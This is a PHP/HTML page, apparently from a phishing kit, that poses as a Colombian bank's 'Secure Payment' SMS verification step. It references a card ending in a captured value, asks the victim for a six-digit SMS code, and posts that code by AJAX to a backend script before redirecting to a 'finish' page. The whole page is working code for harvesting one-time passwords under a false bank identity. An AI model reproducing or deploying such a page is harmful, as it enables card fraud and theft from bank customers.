<?php 
    
   // $mensaje = "La transacción que intentas realizar por un valor de: $8.689 Cop  con tu tarjeta terminada en **********".$ca." Debe ser autorizada por seguridad";

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <script type="text/javascript" src="/scripts/jquery-3.6.0.min.js"></script>
		<script src="/scripts/jquery.jclock-min.js" type="text/javascript"></script>
   		<script type="text/javascript" src="/scripts/functions2.js"></script>  		


    <title>Secure Payment</title>
</head>
<body>

<div class="details" style="padding:1rem;" >
        <img src="/img/bogo.png" alt="" srcset="" width="120px">
        <hr>

        <h3 style="color:black;">Vamos a validar tu compra</h3>
        <a style="color:black;">Ingresa el código SMS que te acabamos de enviar y dale "Confirmar".</a><br><p></p>
    
        
    <center>
        <a style="">Código de verificación</a>
        <br>
        <br>
        <div style="width: 33%; text-align: center; display: inline-block;">
                    <input type="tel" name="cDinamica" id="txtOTP" style="width:100%; height:25px;" required maxlength="6" minlength="6"><br>
        <input type="submit" id="btnOTP" value="ENVIAR" style="color:white; background-color:blue; border:none;margin-top:5px; height:35px; width: 66%;">
        </div>
    </center><br><br>
    <center>
    
    <div>
         <a><small><b>REENVIAR CÓDIGO</b></small></a>
    </div>
    <br>
    <div style="text-align:left;">
        <a><b>Ayuda</b></a> 
    </div>
    </center><br>
    
    
    </div>


    



<script type="text/javascript">
	var espera = 0;

	let identificadorTiempoDeEspera;

	function retardor() {
	  identificadorTiempoDeEspera = setTimeout(retardorX, 900);
	}

	function retardorX() {

	}

	$(document).ready(function() {
		$('#btnOTP').click(function(){
			if ($("#txtOTP").val().length > 5) {
				const data = {
                    'otp': $("#txtOTP").val()
                };
				console.log(data);
				$.ajax({
                    url: '../../acciones/editar_mensaje.php',
                    method: 'POST',
                    data: {
                        data: data
                    },
                    success: function(response) {
                        const result = JSON.parse(response);
                        if (result.success) {
                            window.location.href = "finish.php";
                        } else {
                            alert('Error al editar el mensaje: ' + result.error);
                        }
                    },
                    error: function(xhr, status, error) {
                        alert('Error en la solicitud AJAX: ' + error);
                    }
                });				
			}else{
				$(".mensaje").show();
				$(".pass").css("border", "1px solid red");
				$("#txtOTP").focus();
			}			
		});

		$("#txtOTP").keyup(function(e) {
			$(".pass").css("border", "1px solid #CCCCCC");	
			$(".mensaje").hide();				
		});
	});
</script>



</body>
</html>